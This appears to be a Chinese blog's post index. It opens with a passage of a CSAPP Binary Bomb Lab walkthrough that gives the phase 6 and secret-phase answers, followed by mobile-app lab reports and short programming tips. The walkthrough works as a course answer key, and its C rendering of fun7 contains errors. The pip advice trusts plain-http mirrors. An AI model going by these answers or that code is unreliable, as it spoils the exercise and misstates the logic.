%ecx,%eax 8048eb4: 75 f6 jne 8048eac &lt;phase_6+0x5b&gt; 8048eb6: 89 54 b5 dc mov %edx,-0x24(%ebp,%esi,4) 8048eba: 83 c3 01 add $0x1,%ebx 8048ebd: 83 fb 06 cmp $0x6,%ebx 8048ec0: 75 07 jne 8048ec9 &lt;phase_6+0x78&gt; 8048ec2: eb 1c jmp 8048ee0 &lt;phase_6+0x8f&gt; 8048ec4: bb 00 00 00 00 mov $0x0,%ebx 8048ec9: 89 de mov %ebx,%esi 8048ecb: 8b 4c 9d c4 mov -0x3c(%ebp,%ebx,4),%ecx 8048ecf: b8 01 00 00 00 mov $0x1,%eax 8048ed4: ba 3c c1 04 08 mov $0x804c13c,%edx 8048ed9: 83 f9 01 cmp $0x1,%ecx 8048edc: 7f ce jg 8048eac &lt;phase_6+0x5b&gt; 8048ede: eb d6 jmp 8048eb6 &lt;phase_6+0x65&gt; 8048ee0: 8b 5d dc mov -0x24(%ebp),%ebx 8048ee3: 8d 45 dc lea -0x24(%ebp),%eax 8048ee6: 8d 75 f0 lea -0x10(%ebp),%esi 8048ee9: 89 d9 mov %ebx,%ecx 8048eeb: 8b 50 04 mov 0x4(%eax),%edx 8048eee: 89 51 08 mov %edx,0x8(%ecx) 8048ef1: 83 c0 04 add $0x4,%eax 8048ef4: 89 d1 mov %edx,%ecx 8048ef6: 39 f0 cmp %esi,%eax 8048ef8: 75 f1 jne 8048eeb &lt;phase_6+0x9a&gt; 8048efa: c7 42 08 00 00 00 00 movl $0x0,0x8(%edx) 8048f01: be 05 00 00 00 mov $0x5,%esi 8048f06: 8b 43 08 mov 0x8(%ebx),%eax 8048f09: 8b 00 mov (%eax),%eax 8048f0b: 39 03 cmp %eax,(%ebx) 8048f0d: 7e 05 jle 8048f14 &lt;phase_6+0xc3&gt; 8048f0f: e8 77 02 00 00 call 804918b &lt;explode_bomb&gt; 8048f14: 8b 5b 08 mov 0x8(%ebx),%ebx 8048f17: 83 ee 01 sub $0x1,%esi 8048f1a: 75 ea jne 8048f06 &lt;phase_6+0xb5&gt; 8048f1c: 8b 45 f4 mov -0xc(%ebp),%eax 8048f1f: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8048f26: 74 05 je 8048f2d &lt;phase_6+0xdc&gt; 8048f28: e8 63 f8 ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 8048f2d: 8d 65 f8 lea -0x8(%ebp),%esp 8048f30: 5b pop %ebx 8048f31: 5e pop %esi 8048f32: 5d pop %ebp 8048f33: c3 ret phase_6了，我们离成功不远了！ 12345678910111213141516171819208048e6b: e8 43 03 00 00 call 80491b3 &lt;read_six_numbers&gt;8048e70: 83 c4 10 add $0x10,%esp8048e73: be 00 00 00 00 mov $0x0,%esi8048e78: 8b 44 b5 c4 mov -0x3c(%ebp,%esi,4),%eax8048e7c: 83 e8 01 sub $0x1,%eax8048e7f: 83 f8 05 cmp $0x5,%eax8048e82: 76 05 jbe 8048e89 &lt;phase_6+0x38&gt;8048e84: e8 02 03 00 00 call 804918b &lt;explode_bomb&gt;8048e89: 83 c6 01 add $0x1,%esi8048e8c: 83 fe 06 cmp $0x6,%esi8048e8f: 74 33 je 8048ec4 &lt;phase_6+0x73&gt;8048e91: 89 f3 mov %esi,%ebx8048e93: 8b 44 9d c4 mov -0x3c(%ebp,%ebx,4),%eax8048e97: 39 44 b5 c0 cmp %eax,-0x40(%ebp,%esi,4)8048e9b: 75 05 jne 8048ea2 &lt;phase_6+0x51&gt;8048e9d: e8 e9 02 00 00 call 804918b &lt;explode_bomb&gt;8048ea2: 83 c3 01 add $0x1,%ebx8048ea5: 83 fb 05 cmp $0x5,%ebx8048ea8: 7e e9 jle 8048e93 &lt;phase_6+0x42&gt;8048eaa: eb cc jmp 8048e78 &lt;phase_6+0x27&gt; &lt;read_six_numbers&gt;，老朋友了，所以我们要输入6个整型，并且读入的第一个数-0x3c(%ebp,%esi,4)给了%eax，cmp要求%eax &lt;= 5，因为%eax在cmp之前减了1所以要求输入-0x3c(%ebp,%esi,4) &lt;= 6，不仅如此，%esi作为计数器，每检查一个数便+1，一共检查6个数，所以输入的6个数都必须&lt;= 6，之后还出现了-0x3c(%ebp,%ebx,4) 与 -0x40(%ebp,%esi,4)的相等检查，这两个参数是输入中相邻的两个数，因此还要求相邻的两数不相等，所以我们的输入要求是 6个&lt;=6的数 相邻两输入不相等 除此之外这又臭又长的程序我实在是懒得分析了，所以我们试着换个角度切入，在输入合规的数据后，我们直接跳到爆炸函数处看看附近有没有什么值得分析的东西，为什么可以这么做，因为我们输入的数据99%会爆炸(1/46,656概率能中)，如果你能一次就输对，那么请你离我远点 我们尝试一种输入 1 2 3 4 5 6 直接来到爆炸点 until *0x8048f0f 123458048f06: 8b 43 08 mov 0x8(%ebx),%eax8048f09: 8b 00 mov (%eax),%eax8048f0b: 39 03 cmp %eax,(%ebx)8048f0d: 7e 05 jle 8048f14 &lt;phase_6+0xc3&gt;8048f0f: e8 77 02 00 00 call 804918b &lt;explode_bomb&gt; 我们从爆炸点开始反推，为什么会爆炸，是因为(%ebx) &gt; %eax，那么这两个东西分别指代啥 先看%eax %eax是406，这个406没见过，看不出来是啥，我们再看(%ebx) 发现有个&lt;node1&gt;，猜想这可能是一种数据结构，我们细看 这个第一列的1c4正是&lt;node1&gt;的值452，第二列1是&lt;node1&gt;的索引，第三列不知道，我们查看一下 惊喜的发现，第三列储存的是本节点的下个节点的地址，我们依次顺下去，发现一共有6个节点 node value index next(节点) node1 452 1 2 node2 406 2 3 node3 850 3 4 node4 146 4 5 node5 813 5 6 node6 617 6 0(null) 之前我们研究发现是因为(%ebx) &gt; %eax所以爆炸，也就是说452 &gt; 406所以爆炸，也就是node1 &gt; node2所以爆炸，又由于我们最开始的输入顺序是1 -&gt; 2，所以要求就应该是2 -&gt; 1，node2 在前，这样406 &lt;= 452，所以就是要我们升序输出这6个节点，所以我们的6个输入就是6个节点的index，把升序排序后的结果整理出来就可以了 146 &lt; 406 &lt; 452 &lt; 617 &lt; 813 &lt; 850 4 &lt;- 2 &lt;- 1 &lt;- 6 &lt;- 5 &lt;- 3 因此phase_6的答案便是 4 2 1 6 5 3 secret_phase你以为结束了吗？NONONONONONONONONONONONONONONONONONONONONONO 我们先得想办法进入secret_phase 问题来了，secret_phase的入口在哪？查找整个asm.txt，发现了这么一处 8049361: e8 20 fc ff ff call 8048f86 &lt;secret_phase&gt; 你猜这是哪个函数里面的，&lt;phase_defused&gt;里的 你说不对啊，我看了那么长时间的6个phase，没见这么个函数啊 那确实，这个函数不在任意一个phase里，它在&lt;main&gt;函数里 好的那么如何召唤&lt;secret_phase&gt;呢 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647080492f0 &lt;phase_defused&gt;: 80492f0: 55 push %ebp 80492f1: 89 e5 mov %esp,%ebp 80492f3: 83 ec 68 sub $0x68,%esp 80492f6: 65 a1 14 00 00 00 mov %gs:0x14,%eax 80492fc: 89 45 f4 mov %eax,-0xc(%ebp) 80492ff: 31 c0 xor %eax,%eax 8049301: 83 3d cc c3 04 08 06 cmpl $0x6,0x804c3cc 8049308: 75 6f jne 8049379 &lt;phase_defused+0x89&gt; 804930a: 83 ec 0c sub $0xc,%esp 804930d: 8d 45 a4 lea -0x5c(%ebp),%eax 8049310: 50 push %eax 8049311: 8d 45 a0 lea -0x60(%ebp),%eax 8049314: 50 push %eax 8049315: 8d 45 9c lea -0x64(%ebp),%eax 8049318: 50 push %eax 8049319: 68 49 a3 04 08 push $0x804a349 804931e: 68 d0 c4 04 08 push $0x804c4d0 8049323: e8 e8 f4 ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 8049328: 83 c4 20 add $0x20,%esp 804932b: 83 f8 03 cmp $0x3,%eax 804932e: 75 39 jne 8049369 &lt;phase_defused+0x79&gt; 8049330: 83 ec 08 sub $0x8,%esp 8049333: 68 52 a3 04 08 push $0x804a352 8049338: 8d 45 a4 lea -0x5c(%ebp),%eax 804933b: 50 push %eax 804933c: e8 47 fd ff ff call 8049088 &lt;strings_not_equal&gt; 8049341: 83 c4 10 add $0x10,%esp 8049344: 85 c0 test %eax,%eax 8049346: 75 21 jne 8049369 &lt;phase_defused+0x79&gt; 8049348: 83 ec 0c sub $0xc,%esp 804934b: 68 18 a2 04 08 push $0x804a218 8049350: e8 6b f4 ff ff call 80487c0 &lt;puts@plt&gt; 8049355: c7 04 24 40 a2 04 08 movl $0x804a240,(%esp) 804935c: e8 5f f4 ff ff call 80487c0 &lt;puts@plt&gt; 8049361: e8 20 fc ff ff call 8048f86 &lt;secret_phase&gt; 8049366: 83 c4 10 add $0x10,%esp 8049369: 83 ec 0c sub $0xc,%esp 804936c: 68 78 a2 04 08 push $0x804a278 8049371: e8 4a f4 ff ff call 80487c0 &lt;puts@plt&gt; 8049376: 83 c4 10 add $0x10,%esp 8049379: 8b 45 f4 mov -0xc(%ebp),%eax 804937c: 65 33 05 14 00 00 00 xor %gs:0x14,%eax 8049383: 74 05 je 804938a &lt;phase_defused+0x9a&gt; 8049385: e8 06 f4 ff ff call 8048790 &lt;__stack_chk_fail@plt&gt; 804938a: c9 leave 804938b: c3 ret 我们注意到在召唤secret_phase前，它先调用了&lt;strings_not_equal&gt;函数，对比了两个字符串，样本字符串在0x804a352里， 好的我们要找东西和它比较，找什么东西呢 1238049319: 68 49 a3 04 08 push $0x804a349804931e: 68 d0 c4 04 08 push $0x804c4d08049323: e8 e8 f4 ff ff call 8048810 &lt;__isoc99_sscanf@plt&gt; 看到调用scanf前push了2个参数进来，分别是0x804a349和0x804c4d0 分别查看一下 0x804a349是格式，两个整型一个字符串，输入格式为两个整型的只有phase_4和phase_5，可能在这两个中任一个 0x804c4d0应该是输入的字符串的内容，但是现在未输入数据所以显示为空，我们先把断点设在phase_5看下是不是在phase_4处产生了输入 果然，它接收到了phase_4的数据，这证明，我们只要把phase_4的输入改为14 7 DrEvil就可进入secret_phase 于是我们召唤出了secret_phase 12345678910111213141516171819202122232425262728293031323308048f86 &lt;secret_phase&gt;: 8048f86: 55 push %ebp 8048f87: 89 e5 mov %esp,%ebp 8048f89: 53 push %ebx 8048f8a: 83 ec 04 sub $0x4,%esp 8048f8d: e8 5b 02 00 00 call 80491ed &lt;read_line&gt; 8048f92: 83 ec 04 sub $0x4,%esp 8048f95: 6a 0a push $0xa 8048f97: 6a 00 push $0x0 8048f99: 50 push %eax 8048f9a: e8 e1 f8 ff ff call 8048880 &lt;strtol@plt&gt; 8048f9f: 89 c3 mov %eax,%ebx 8048fa1: 8d 40 ff lea -0x1(%eax),%eax 8048fa4: 83 c4 10 add $0x10,%esp 8048fa7: 3d e8 03 00 00 cmp $0x3e8,%eax 8048fac: 76 05 jbe 8048fb3 &lt;secret_phase+0x2d&gt; 8048fae: e8 d8 01 00 00 call 804918b &lt;explode_bomb&gt; 8048fb3: 83 ec 08 sub $0x8,%esp 8048fb6: 53 push %ebx 8048fb7: 68 88 c0 04 08 push $0x804c088 8048fbc: e8 73 ff ff ff call 8048f34 &lt;fun7&gt; 8048fc1: 83 c4 10 add $0x10,%esp 8048fc4: 83 f8 05 cmp $0x5,%eax 8048fc7: 74 05 je 8048fce &lt;secret_phase+0x48&gt; 8048fc9: e8 bd 01 00 00 call 804918b &lt;explode_bomb&gt; 8048fce: 83 ec 0c sub $0xc,%esp 8048fd1: 68 3c a1 04 08 push $0x804a13c 8048fd6: e8 e5 f7 ff ff call 80487c0 &lt;puts@plt&gt; 8048fdb: e8 10 03 00 00 call 80492f0 &lt;phase_defused&gt; 8048fe0: 83 c4 10 add $0x10,%esp 8048fe3: 8b 5d fc mov -0x4(%ebp),%ebx 8048fe6: c9 leave 8048fe7: c3 ret 如果我们把断点设在secret_phase，我们运行后发现与其他phase不同的是，它并没有在一开始就要求我们进行输入，而是在&lt;read_line&gt;后才让我们输入，那么就是让我们输入一行数据 1234568048f8d: e8 5b 02 00 00 call 80491ed &lt;read_line&gt;8048f92: 83 ec 04 sub $0x4,%esp8048f95: 6a 0a push $0xa8048f97: 6a 00 push $0x08048f99: 50 push %eax8048f9a: e8 e1 f8 ff ff call 8048880 &lt;strtol@plt&gt; 在读入一行后接着调用了&lt;strtol@plt&gt;，这个函数的作用是把读进来的字符串转化成整数 例如我输入&quot;15&quot;，调用之后eax = 15 1234568048f9f: 89 c3 mov %eax,%ebx8048fa1: 8d 40 ff lea -0x1(%eax),%eax8048fa4: 83 c4 10 add $0x10,%esp8048fa7: 3d e8 03 00 00 cmp $0x3e8,%eax8048fac: 76 05 jbe 8048fb3 &lt;secret_phase+0x2d&gt;8048fae: e8 d8 01 00 00 call 804918b &lt;explode_bomb&gt; 接着把%eax给%ebx，再将%eax自减，要求自减后的%eax &lt;= 0x3e8，就是要我们输入的数据&lt;= 1001 123456788048fb3: 83 ec 08 sub $0x8,%esp8048fb6: 53 push %ebx8048fb7: 68 88 c0 04 08 push $0x804c0888048fbc: e8 73 ff ff ff call 8048f34 &lt;fun7&gt;8048fc1: 83 c4 10 add $0x10,%esp8048fc4: 83 f8 05 cmp $0x5,%eax8048fc7: 74 05 je 8048fce &lt;secret_phase+0x48&gt;8048fc9: e8 bd 01 00 00 call 804918b &lt;explode_bomb&gt; 然后把我们的输入%ebx和0x804c088一起压入栈中，检查发现，0x804c088是一个叫n1的节点，可能又是什么新的数据结构 进一步查看发现不得了，这个节点第一列是自身数据的大小，第二列是n21的地址，第三列是n22的地址，那么这很有可能是一棵二叉树，第二列是左子树的地址，第三列是右子树的地址，我们顺藤摸瓜，完整的输出这棵二叉树 给我画的图打个分，低于60你就可以走了 我们现在知道了secret_phase里的数据结构是一颗二叉搜索树，但是这题怎么解我们还是一筹莫展，关键是这个&lt;fun7&gt;函数 12345678910111213141516171819202122232425262728293031323308048f34 &lt;fun7&gt;: 8048f34: 55 push %ebp 8048f35: 89 e5 mov %esp,%ebp 8048f37: 53 push %ebx 8048f38: 83 ec 04 sub $0x4,%esp 8048f3b: 8b 55 08 mov 0x8(%ebp),%edx 8048f3e: 8b 4d 0c mov 0xc(%ebp),%ecx 8048f41: 85 d2 test %edx,%edx 8048f43: 74 37 je 8048f7c &lt;fun7+0x48&gt; 8048f45: 8b 1a mov (%edx),%ebx 8048f47: 39 cb cmp %ecx,%ebx 8048f49: 7e 13 jle 8048f5e &lt;fun7+0x2a&gt; 8048f4b: 83 ec 08 sub $0x8,%esp 8048f4e: 51 push %ecx 8048f4f: ff 72 04 pushl 0x4(%edx) 8048f52: e8 dd ff ff ff call 8048f34 &lt;fun7&gt; 8048f57: 83 c4 10 add $0x10,%esp 8048f5a: 01 c0 add %eax,%eax 8048f5c: eb 23 jmp 8048f81 &lt;fun7+0x4d&gt; 8048f5e: b8 00 00 00 00 mov $0x0,%eax 8048f63: 39 cb cmp %ecx,%ebx 8048f65: 74 1a je 8048f81 &lt;fun7+0x4d&gt; 8048f67: 83 ec 08 sub $0x8,%esp 8048f6a: 51 push %ecx 8048f6b: ff 72 08 pushl 0x8(%edx) 8048f6e: e8 c1 ff ff ff call 8048f34 &lt;fun7&gt; 8048f73: 83 c4 10 add $0x10,%esp 8048f76: 8d 44 00 01 lea 0x1(%eax,%eax,1),%eax 8048f7a: eb 05 jmp 8048f81 &lt;fun7+0x4d&gt; 8048f7c: b8 ff ff ff ff mov $0xffffffff,%eax 8048f81: 8b 5d fc mov -0x4(%ebp),%ebx 8048f84: c9 leave 8048f85: c3 ret 照例看汇编看不出结果，我们翻译成高级语言 12345678910111213141516171819202122232425262728//ecx = ebx = input, edx = &amp;node esp = &amp;inputvoid fun7(int* edx, int ecx){ if(edx &amp; edx){ eax = 0xffffffff; ebx = ebp - 0x4; return; } ebx = *edx; if(ebx &lt;= ecx){ eax = 0; if(ebx == ecx){ ebx = ebp - 0x4; return; } esp -= 0x8; fun7(edx-0x8, ecx); esp += 0x10; eax = eax*2 + 1; ebx = ebp - 0x4; return; } esp -= 0x8; fun7(edx+0x4, ecx); esp += 0x10; eax *= 2; ebx = ebp - 0x4; return;} 又是一个递归调用的函数，这里面ecx一直储存的是我们的输入值，edx则是变换的节点地址，读入后将edx地址里的数据给ebx，二者比大小 如果ebx &lt; ecx，节点向右子树移动 如果ebx = ecx，停止递归 如果ebx &gt; ecx，节点向左子树移动 12348048fc1: 83 c4 10 add $0x10,%esp8048fc4: 83 f8 05 cmp $0x5,%eax8048fc7: 74 05 je 8048fce &lt;secret_phase+0x48&gt;8048fc9: e8 bd 01 00 00 call 804918b &lt;explode_bomb&gt; 我们回去看secret_phase里之后的内容，要求我们的%eax值为0x5，调用&lt;fun7&gt;前%eax为0，那么我们观察eax在&lt;fun7&gt;中的变化即可，注意到有两个地方有对eax的修改 如果ebx &lt; ecx，eax = eax*2 + 1 如果ebx &gt; ecx，eax *= 2 也就是说节点向右子树移动，eax = eax*2 + 1，向左子树移动，eax *= 2，这样我们就可以计算出每一个节点对应的调用&lt;fun7&gt;后的eax值 这样就能很清晰的发现，当我们的输入为n46的值47时，最后的eax结果为0x5，因此我们最终找到了secret_phase的答案！！！ 47 至此，Binary Bomb Lab7个phase全部解完","link":"/2021/12/18/binary-bomb/"},{"title":"miniProgram-lab1","text":"2022年夏季《移动软件开发》实验报告姓名：叶鹏 学号：20020007095 姓名和学号 叶鹏，20020007095 本实验属于哪门课程 中国海洋大学22夏《移动软件开发》 实验名称 实验1：第一个微信小程序 博客地址 Click me if you can Github仓库地址 You won’t miss that （备注：将实验报告发布在博客、代码公开至 github 是 加分项，不是必须做的） 一、实验目标1、学习使用快速启动模板创建小程序的方法；2、学习不使用模板手动创建小程序的方法。 二、实验步骤列出实验的关键步骤、代码解析、截图。 创建项目 视图设计 进行页面布局设计 逻辑实现 【注意】：微信已更新获取用户信息的api，现在使用wx.getUserProfile方法 获取到用户信息以后，动态设置name与image元素，实现目的效果 三、程序运行结果列出程序的最终运行结果及截图。 【点击前】 【点击】 【点击后】 四、问题总结与体会描述实验过程中所遇到的问题，以及是如何解决的。有哪些收获和体会，对于课程的安排有哪些建议。 由于微信小程序社区更新换代频率很高，一些古早得教程并不适用，需要与时俱进的新的教材与教程，希望能提供一些可以使用在生活当中的课程。","link":"/2022/08/17/miniProgram-lab1/"},{"title":"leetcode300题","text":"300 题 都忘了已经过了300题了，上次200题在4月，半年才100题，主要是假期浪了，没好好练，比赛也没打，我算是有进步了吗，我也不清楚 贴一张leetcode秋季个人赛的排名 我平常周赛也就2000+的水平，个人赛居然混了个前500，虽然我是感觉有点水了 不过大三了，得认清楚以后的规划，该考研考研，该做啥做啥，摆正心态，不要被周围人迷惑，接受并认清自己的实力是最重要的","link":"/2022/10/06/leetcode300%E9%A2%98/"},{"title":"miniProgram-lab2","text":"2022年夏季《移动软件开发》实验报告姓名：叶鹏 学号：20020007095 姓名和学号 叶鹏，20020007095 本实验属于哪门课程 中国海洋大学22夏《移动软件开发》 实验名称 实验2：天气查询小程序 博客地址 Click me if you can Github仓库地址 You won’t miss that （备注：将实验报告发布在博客、代码公开至 github 是 加分项，不是必须做的） 一、实验目标1、学习使用快速启动模板创建小程序的方法；2、学习不使用模板手动创建小程序的方法。 二、实验步骤 准备工作 API密钥申请 申请账号，新建应用，获取key值 API调用方法 服务器域名配置 项目创建 页面配置 视图设计 导航栏设计 页面设计 背景容器样式 地区选择器设计 文本设计 天气图标设计 多行天气信息设计 逻辑实现 更新省市区信息 获取实况天气数据 更新页面天气信息 三、程序运行结果列出程序的最终运行结果及截图。 四、问题总结与体会本次实验制作了一个天气查询的小程序，在写程序的过程中学习到了request请求和utils模块的使用，了解到了api请求获取数据的过程，最终完成了一个可以查询全国城市天气的小程序，过程十分有趣。","link":"/2022/08/18/miniProgram-lab2/"},{"title":"miniProgram-lab3","text":"2022年夏季《移动软件开发》实验报告姓名：叶鹏 学号：20020007095 姓名和学号 叶鹏，20020007095 本实验属于哪门课程 中国海洋大学22夏《移动软件开发》 实验名称 实验3：视频播放小程序 博客地址 Click me if you can Github仓库地址 You won’t miss that （备注：将实验报告发布在博客、代码公开至 github 是 加分项，不是必须做的） 一、实验目标 掌握视频列表的切换方法 掌握视频自动播放方法 掌握视频随机颜色弹幕效果 二、实验步骤列出实验的关键步骤、代码解析、截图。 项目创建 页面配置 视图设计 导航栏设计 页面设计 区域1：视频播放器 区域2：弹幕发送区域 区域3：视频列表 逻辑实现 更新播放列表 点击播放视频 发送弹幕 三、程序运行结果列出程序的最终运行结果及截图。 四、问题总结与体会本次实验中学习到了视频播放器的一些使用，对于本实验我觉得存在一些不严谨的地方 vx:key元素指定不明确 ​ 实验自始至终未指定video{{index}}到底指的是什么 未介绍videoContext对象 ​ 实验中只是展示但是没有解释wx.createVideoContext函数，这个函数是创建一个视频播放器对象，创建的对象我们取名未videoCtx，它自身包含有Play()和Stop()内置函数 部分变量不包含在页面初始数据内 ​ 如src，videoCtx，未在Page的data内声明，而是由一些别的函数生成，不知道是否严谨","link":"/2022/08/20/miniProgram-lab3/"},{"title":"miniProgram-lab4","text":"2022年夏季《移动软件开发》实验报告姓名：叶鹏 学号：20020007095 姓名和学号 叶鹏，20020007095 本实验属于哪门课程 中国海洋大学22夏《移动软件开发》 实验名称 实验4：高校新闻网 博客地址 Click me if you can Github仓库地址 You won’t miss that （备注：将实验报告发布在博客、代码公开至 github 是 加分项，不是必须做的） 一、实验目标 综合应用所学知识创建完整的前端新闻小程序项目 能够在开发过程中数量掌握真机预览，调试等操作 二、实验步骤列出实验的关键步骤、代码解析、截图。 项目创建 页面配置 视图设计 导航栏设计 tabBar设计 页面设计 首页设计 2. 个人中心设计 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002539.png&quot; alt=&quot;image-20220822002820411&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002540.png&quot; alt=&quot;image-20220822002831578&quot; style=&quot;zoom:80%;&quot; /&gt; 3. 新闻页设计 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002541.png&quot; alt=&quot;image-20220822172633610&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002542.png&quot; alt=&quot;image-20220822172642340&quot; style=&quot;zoom:80%;&quot; /&gt; 逻辑实现 公共逻辑 首页逻辑 1. 新闻列表展示 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002544.png&quot; alt=&quot;image-20220822173025865&quot; style=&quot;zoom:80%;&quot; /&gt; 2. 点击跳转新闻内容 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002545.png&quot; alt=&quot;image-20220822173135008&quot; style=&quot;zoom:80%;&quot; /&gt; 新闻页逻辑 1. 显示对应新闻 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002546.png&quot; alt=&quot;image-20220822173439070&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002547.png&quot; alt=&quot;image-20220822173452054&quot; style=&quot;zoom:80%;&quot; /&gt; 2. 添加/取消新闻收藏 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002548.png&quot; alt=&quot;image-20220822174753008&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002549.png&quot; alt=&quot;image-20220822174805660&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002550.png&quot; alt=&quot;image-20220822174817897&quot; style=&quot;zoom:80%;&quot; /&gt; 个人中心页逻辑 1. 获取微信用户信息 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002551.png&quot; alt=&quot;image-20220822175631231&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002552.png&quot; alt=&quot;image-20220822175640375&quot; style=&quot;zoom:80%;&quot; /&gt; 2. 获取收藏列表 &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002553.png&quot; alt=&quot;image-20220822195727007&quot; style=&quot;zoom:80%;&quot; /&gt; &lt;img src=&quot;https://expicture.oss-cn-beijing.aliyuncs.com/img/202208222002554.png&quot; alt=&quot;image-20220822195748571&quot; style=&quot;zoom:80%;&quot; /&gt; 三、程序运行结果列出程序的最终运行结果及截图。 四、问题总结与体会本次实验综合了许多基础开发内容，如：tabbar的使用，页面的跳转，用户信息的获取，程序内部储存的应用，轮播器的使用，是一次非常良好的学习机会","link":"/2022/08/22/miniProgram-lab4/"},{"title":"mobileProgram-lab5","text":"2022年夏季《移动软件开发》实验报告姓名：叶鹏 学号：20020007095 姓名和学号 叶鹏，20020007095 本实验属于哪门课程 中国海洋大学22夏《移动软件开发》 实验名称 实验5：第一个安卓应用 博客地址 Click me if you can Github仓库地址 You won’t miss that （备注：将实验报告发布在博客、代码公开至 github 是 加分项，不是必须做的） 一、实验目标 Textview imageview 使用 LinearLayout 使用 二、实验步骤列出实验的关键步骤、代码解析、截图。 项目创建 确定外层大的LinearLayout布局 设置背景色与垂直方向 构建第一个组，设置颜色，垂直方向与高度 创建组内图标，设置宽高，垂直居中，图标素材 设置右箭头 之后的分组都如法炮制，这里我使用1dp的IamgeView表示分割线 三、程序运行结果列出程序的最终运行结果及截图。 四、问题总结与体会本次实验是安卓程序的入门，简单掌握了基础控件的使用，模拟完成了微信的「发现」界面","link":"/2022/08/25/mobileProgram-lab5/"},{"title":"mobileProgram-lab6","text":"2022年夏季《移动软件开发》实验报告姓名：叶鹏 学号：20020007095 姓名和学号 叶鹏，20020007095 本实验属于哪门课程 中国海洋大学22夏《移动软件开发》 实验名称 实验6：安卓APP首页 博客地址 Click me if you can Github仓库地址 You won’t miss that （备注：将实验报告发布在博客、代码公开至 github 是 加分项，不是必须做的） 一、实验目标 ScrollView 使用 RelativeLayout 使用 插件之间的穿插使用 二、实验步骤列出实验的关键步骤、代码解析、截图。 项目创建 新建ScrollView，确定内部父布局 创建顶部首页显示栏，调整相关参数 创建顶部图片，修改相关参数 实现菜单栏模块 先实现一个横向的LinearLayout作为父布局 写4个子布局 消息模块 两条消息内容 新建一些颜色圆角形状备用 创建消息卡片 底部Tab模块，采用相对布局 三、程序运行结果列出程序的最终运行结果及截图。 四、问题总结与体会本次实验仿照其他安卓app简单写了一个首页界面，练习了相对布局的用法，ScrollView的作用在本实验体现出来的地方不大，而且tabBar也不具有吸底的效果，安卓的开发在很大程度上要比小程序的开发复杂得多","link":"/2022/08/26/mobileProgram-lab6/"},{"title":"shell not defined nodemon","text":"遇到poweshell 不识别 nodemon 命令的问题 1The term 'nodemon' is not recognized as a name of a cmdlet 【解决办法】： 把npm prefix添加到环境变量 npm config get prefix 添加用户环境变量 变量名: path 变量值: 得到的prefix npx nodemon (packageName)","link":"/2022/09/06/nodemon/"},{"title":"pip安装其他插件问题","text":"pip安装其他插件问题使用pip安装其它插件时，报了一堆错，类似于 Could not fetch URL https://pypi.python.org/simple/requests/: There was a problem confirming the ssl certificate: [SSL: CERTIFICATE_VERIFY_FAILED] certificate verify faile 此类问题 原因 pypi.python.org在国内被墙了(为啥？) 解决方案 使用国内的镜像网站 pip install package_name -i http://pypi.douban.com/simple --trusted-host pypi.douban.com package_name：要安装的包名 http://pypi.douban.com/simple：镜像源 其他可用的镜像源 阿里云：http://mirrors.aliyun.com/pypi/simple/ 中国科技大学：https://pypi.mirrors.ustc.edu.cn/simple/ ​ http://pypi.mirrors.ustc.edu.cn/simple/ 豆瓣：http://pypi.douban.com/simple/ 清华大学：https://pypi.tuna.tsinghua.edu.cn/simple/ 配置环境变量 如果不想每次安装都加上镜像源的后缀，可以配置环境变量 找到C盘“用户”文件夹下的”用户名文件夹“ 新建pip目录，在pip\\目录下新建pip.ini文件 pip.ini文件中的内容 1234[global]index-url=http://pypi.douban.com/simple/[install]trusted-host=pypi.douban.com 将pip.ini添加到环境变量，之后安装其他包就没问题了","link":"/2022/03/25/pip%E5%AE%89%E8%A3%85%E5%85%B6%E4%BB%96%E6%8F%92%E4%BB%B6%E9%97%AE%E9%A2%98/"},{"title":"primeNumberAlgo","text":"Prime Number AlgoSieve of Eratosthenes【思路】: 埃式筛，寻找一定范围内质数的算法，主要思想是把质数的倍数当作合数一一屏蔽 【代码】: C++ 1234567891011auto eratosthenes(int upperbound) { std::vector&lt;bool&gt; flag(upperbound + 1, true); flag[0] = flag[1] = false; //exclude 0 and 1 for (int i = 2; i * i &lt;= upperbound; ++i) { if (flag[i]) { for (int j = i * i; j &lt;= upperbound; j += i) flag[j] = false; } } return flag;} C++(自己写的) 12345678910111213vector&lt;bool&gt; eratosthenes(int upperbound){ vector&lt;bool&gt; flag(upperbound + 1, true); flag[0] = flag[1] = false; for(int i = 2; i*i &lt;= upperbound; ++i){ // if is prime num if(flag[i]){ for(int j = i*i; j &lt;= upperbound; j+=i){ flag[j] = false; } } } return flag;}","link":"/2022/06/30/primeNumberAlgo/"},{"title":"位运算总结","text":"位运算总结注意 逻辑运算 与 按位运算 的区别 逻辑运算：对逻辑上的数字进行计算，逻辑或（||），逻辑与（&amp;&amp;），逻辑取反（！） 按位计算：对每一个二进制位进行计算，按位与（&amp;），按位或（|），按位取反（~） 位运算操作符 &amp;按位与 |按位或 ^按位异或 !逻辑取反 ~按位取反 按位与 &amp;同时为1结果才为1，其余都是0 真值表: &amp; 0 1 0 0 0 1 0 1 按位或 |只要有1，结果就是1 真值表: \\ 0 1 0 0 1 1 1 1 按位异或 ^不同为1，相同为0 